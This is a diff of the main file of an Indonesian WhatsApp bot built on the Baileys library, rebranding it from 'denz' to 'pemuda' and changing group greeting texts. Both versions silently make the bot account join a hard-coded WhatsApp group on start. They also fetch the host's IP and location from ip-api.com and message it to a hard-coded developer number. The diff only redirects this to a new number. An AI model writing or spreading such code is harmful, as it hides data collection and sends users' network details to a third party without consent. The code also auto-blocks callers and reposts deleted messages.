@@ -1,7 +1,7 @@
 const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
 const simple = require('./lib/simple.js')
 const WAConnection = simple.WAConnection(_WAConnection)
-const denz = new WAConnection()
+const pemuda = new WAConnection()
 const qrcode = require("qrcode-terminal")
 const moment = require("moment-timezone")
 const fs = require("fs")
@@ -17,50 +17,51 @@ const settings = JSON.parse(fs.readFileSync('./settings.json'))
 const sleep = async (ms) => {
 return new Promise(resolve => setTimeout(resolve, ms))
 }
-nocache('./denz.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))
+nocache('./pemuda.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))
 
 async function starts() {
-denz.autoReconnect = ReconnectMode.onConnectionLost
-    denz.version = [2, 2119, 6]
-    denz.logger.level = 'warn'
-    denz.browserDescription = ['Dcode Denpa','Desktop','3.0']
+pemuda.autoReconnect = ReconnectMode.onConnectionLost
+    pemuda.version = [2, 2119, 6]
+    pemuda.logger.level = 'warn'
+    pemuda.browserDescription = ['Pemuda Teknologi','Desktop','3.0']
     await sleep(10000)
-    denz.on('qr', qr => {
+    pemuda.on('qr', qr => {
         qrcode.generate(qr, { small: true })
-        console.log(color('|TRM|'), color('Scan this QR code', 'cyan'))
+        console.log(color('|TRM|'), color('Scan Kodenya bang', 'red'))
     })
-    fs.existsSync('./QRnya.json') && denz.loadAuthInfo('./QRnya.json')
+    fs.existsSync('./QRnya.json') && pemuda.loadAuthInfo('./QRnya.json')
     
-    denz.on('credentials-updated', () => {
+    pemuda.on('credentials-updated', () => {
         console.log(color('|TRM|'), color('credentials updated!', 'cyan'))
         })
      
-      await denz.connect({ timeoutMs: 30 * 1000 });
-  fs.writeFileSync("./QRnya.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
- teks = `https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx`
- denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
- console.log(color('|WRN|', 'yellow'), color('Joined to bitch boot group', 'cyan'))
- denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
+      await pemuda.connect({ timeoutMs: 30 * 1000 });
+  fs.writeFileSync("./QRnya.json",JSON.stringify(pemuda.base64EncodedAuthInfo(), null, "\t"));
+ teks = `https://chat.whatsapp.com/FwwiQjVWk1kIsZ5QHV6uI0`  //JANGAN DI GANTI BEGO ERROR NANTI NANGES
+ teks = `https://chat.whatsapp.com/FwwiQjVWk1kIsZ5QHV6uI0`  //JANGAN DI GANTI BEGO ERROR NANTI NANGES
+ pemuda.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+ console.log(color('|WRN|', 'yellow'), color('Bergabung ke Grup Official Pemuda Teknologi', 'cyan'))
+ pemuda.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pemuda.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pemuda Teknologi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6283818744065?text=Assalamualaikum"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("6285866295942@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
-     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
+       pemuda.sendMessage("6283818744065@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pemuda Teknologi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6283818744065?text=Assalamualaikum"}}})
+     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
       
-    denz.on('connecting', () => {
-		console.log(color('|TRM|'), color('Connecting...', 'cyan'))
+    pemuda.on('connecting', () => {
+		console.log(color('|TRM|'), color('Connecting, Pastikan Jaringan Bagus...', 'cyan'))
 		})
 	
-	denz.on('open', () => {
-	console.log(color('|TRM|'), color('Connected', 'cyan'))
+	pemuda.on('open', () => {
+	console.log(color('|TRM|'), color('Connected, Ketik .menu di Whatsapp..!!', 'cyan'))
 	}) 
      
-    denz.on('ws-close', () => {
+    pemuda.on('ws-close', () => {
         console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'cyan'))
         })
     
-    denz.on('close', async () => {
+    pemuda.on('close', async () => {
         console.log(color('|TRM|'), color('Disconnected.', 'cyan'))
         })
     
@@ -68,106 +69,106 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
 exec(`cd /sdcard/download && play *mp3`)
 }
    
-   denz.on('chat-update', async (mek) => {
-        require('./denz.js')(denz, mek)
-        ownerNumber = ["6285866295942@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "6285866295942@s.whatsapp.net"
+   pemuda.on('chat-update', async (mek) => {
+        require('./pemuda.js')(pemuda, mek)
+        ownerNumber = ["6289626029135@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "6289626029135@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
-        denz.on('group-participants-update', async (anu) => {
+        pemuda.on('group-participants-update', async (anu) => {
            mem = anu.participants[0]
-			const mdata = await denz.groupMetadata(anu.jid)
+			const mdata = await pemuda.groupMetadata(anu.jid)
 		    try {
 			console.log(anu)
 			if (anu.action == 'add') {
-			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6285866295942:6285866295942\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6283818744065:6283818744065\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
 		    num = anu.participants[0]
 			try {
-			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
+			ppimg = await pemuda.getProfilePicture(`${num.split('@')[0]}@c.us`)
 			} catch {
 			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 			}
 			let buff = await getBuffer(ppimg)
-			masuk =`Halo @${num.split('@')[0]}\nSelamat Datang Di ${mdata.subject}`
-            denz.sendMessage(mdata.id, masuk, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./denz.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Welcome To ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://youtu.be/t-5oqggZwVE`}}})
+			masuk =`Eh ads Member baru nih..\nHalo @${num.split('@')[0]}\nSelamat Datang Di ${mdata.subject} \n\nIntro dulu\n*Nama* :\n*Umur* :\n*Kelas* :\n Semoga Betah yak 😉 `
+            pemuda.sendMessage(mdata.id, masuk, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./pemuda_1.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Welcome To ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://youtu.be/TUfv1QV59xU`}}})
 			} else if (anu.action == 'remove') {
-			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6285866295942:6285866295942\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6283818744065:6283818744065\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
 			num = anu.participants[0]
 			try {
-			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
+			ppimg = await pemuda.getProfilePicture(`${num.split('@')[0]}@c.us`)
 			} catch {
 			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 			}
 			let buff = await getBuffer(ppimg)
-			keluar =`Selamat tinggal @${num.split('@')[0]}\nSemoga tentang disana`
-            denz.sendMessage(mdata.id, keluar, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./denz.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Keluar Dari ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://youtu.be/t-5oqggZwVE`}}})
+			keluar =`Yahh, ada yang keluar 😭\nSelamat tinggal @${num.split('@')[0]}\nSemoga gak jadi beban lagi disini :v`
+            pemuda.sendMessage(mdata.id, keluar, MessageType.text, { quoted: fkontakk, thumbnail: fs.readFileSync('./pemuda_1.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `Keluar Dari ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,mediaUrl:`https://youtu.be/TUfv1QV59xU`}}})
 			} else if (anu.action == 'promote') {
-fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6285866295942:6285866295942\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6283818744065:6283818744065\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
 num = anu.participants[0]
-teks = `*P R O M O T E - D E T E C T E D*\n Username: @${num.split('@')[0]}\n Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n Group: ${mdata.subject}`
-denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
+teks = `*P R O M O T E - D E T E C T E D*\nUsername: @${num.split('@')[0]}\nTime : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\nGroup: ${mdata.subject}\n\nSelamat Yah atas Kenaikan Pangkatnya 🔥`
+pemuda.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
 console.log(color('|TRM|'), color(`Promote Member ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
 } 
 else if (anu.action == 'demote') {
-fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6285866295942:6285866295942\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6283818744065:6283818744065\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
 num = anu.participants[0]
-teks = `*D E M O T E - D E T E C T E D*\n Username: @${num.split('@')[0]}\n Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n Group: ${mdata.subject}`
-denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
+teks = `*D E M O T E - D E T E C T E D*\nUsername: @${num.split('@')[0]}\nTime : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\nGroup: ${mdata.subject}\n\nMamposs Nggak jadi Admin lagi, mangkanya yg Becuss..!!`
+pemuda.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
 console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
 }
 		    } catch (e) {
 			console.log('Error : %s', color(e, 'red'))
 		    }
 	        })	       
-	denz.on('group-update', async (anu) => {
-		const metdata = await denz.groupMetadata(anu.jid)
-    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6285866295942:6285866295942\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+	pemuda.on('group-update', async (anu) => {
+		const metdata = await pemuda.groupMetadata(anu.jid)
+    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=6283818744065:6283818744065\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
     if(anu.announce == 'false'){
-    teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
-    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    teks = `- [ Group Opened ] -\n\n_Horee.. Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
+    pemuda.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
     console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
   } 
   else if(anu.announce == 'true'){
-    teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
-    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    teks = `- [ Group Closed ] -\n\n_Yahh..Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
+    pemuda.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
     console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
   }
   else if(!anu.desc == ''){
     tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
     teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
-    denz.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
+    pemuda.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
     console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
   }
   else if(anu.restrict == 'false'){
     teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
-    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    pemuda.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
     console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
   }
   else if(anu.restrict == 'true'){
     teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
-    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    pemuda.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
     console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
   }
 })
 
-denz.on('CB:action,,call', async json => {
+pemuda.on('CB:action,,call', async json => {
         const callerId = json[2][0][1].from;
         var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
-        denz.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
-        denz.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:`https://wa.me/6285866295942?text=Assalamualaikum`}}})
+        pemuda.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
+        pemuda.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:`https://wa.me/6283818744065?text=Assalamualaikum`}}})
         await sleep(5000)
-        await denz.blockUser(callerId, "add")
+        await pemuda.blockUser(callerId, "add")
         })
         
-	denz.on('message-delete', async (m) => {
+	pemuda.on('message-delete', async (m) => {
 if (m.key.remoteJid == 'status@broadcast') return
 if (!m.key.fromMe) {
 m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
 const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
 let d = new Date
-let c = denz.chats.get(m.key.remoteJid)
+let c = pemuda.chats.get(m.key.remoteJid)
 let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
-let co3ntent = denz.generateForwardMessageContent(a, false)
+let co3ntent = pemuda.generateForwardMessageContent(a, false)
 let c3type = Object.keys(co3ntent)[0]
 let locale = 'id'
 let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
@@ -178,12 +179,12 @@ day: 'numeric',
 month: 'long',
 year: 'numeric'
 })
-denz.copyNForward(m.key.remoteJid, m.message)
-denz.sendMessage(m.key.remoteJid, `▷\`\`\`Anti Delete\`\`\`
+pemuda.copyNForward(m.key.remoteJid, m.message)
+pemuda.sendMessage(m.key.remoteJid, `▷\`\`\`Anti Delete\`\`\`
 
-▢ \`\`\`Nama : @${m.participant.split("@")[0]}\`\`\`
-▢ \`\`\`Tipe : ${c3type}\`\`\`
-▢ \`\`\`Tanggal : ${jam} - ${week} ${weton} - ${calender}\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
+⚔️ \`\`\`Nama : @${m.participant.split("@")[0]}\`\`\`
+⚔️ \`\`\`Tipe : ${c3type}\`\`\`
+⚔️ \`\`\`Tanggal : ${jam} - ${week} ${weton} - ${calender}\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
 }
 })
 }
@@ -199,23 +200,23 @@ function doProgress()
 	{
 		setTimeout( function() { console.clear(),
 		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
-			console.log(stdout), console.log(bgcolor('https://github.com/dcode-denpa/bitch-boot', 'cyan'))})}, 200 ) ;
+			console.log(stdout), console.log(bgcolor('Subcribe : Ndyie Botz', 'red'))})}, 200 ) ;
 	}
 	else
 	{
-		setTimeout( doProgress , 100 + Math.random() * 400 ) ;
+		setTimeout( doProgress , 100 + Math.random() * 150 ) ;
 	}
 }
 console.log(color(figlet.textSync(`${settings.NamaBot}`, {
 		font: 'Standard',
 		horizontalLayout: 'default',
 		vertivalLayout: 'default',
-		width: 80,
+		width: 50,
 		whitespaceBreak: true
-	    }), 'lightgreen')), term.slowTyping(' Created By Denis Putra' ,{ flashStyle: term.brightWhite })
+	    }), 'lightgreen')), term.slowTyping('By Katashi - Recode by Katashi Botz' ,{ flashStyle: term.brightWhite })
 progressBar = term.progressBar( {
 	width: 80 ,
-	title: '\n\nLoading' ,
+	title: '\n\nLoading cuyy' ,
 	eta: true ,
 	percent: true
 } ) ;
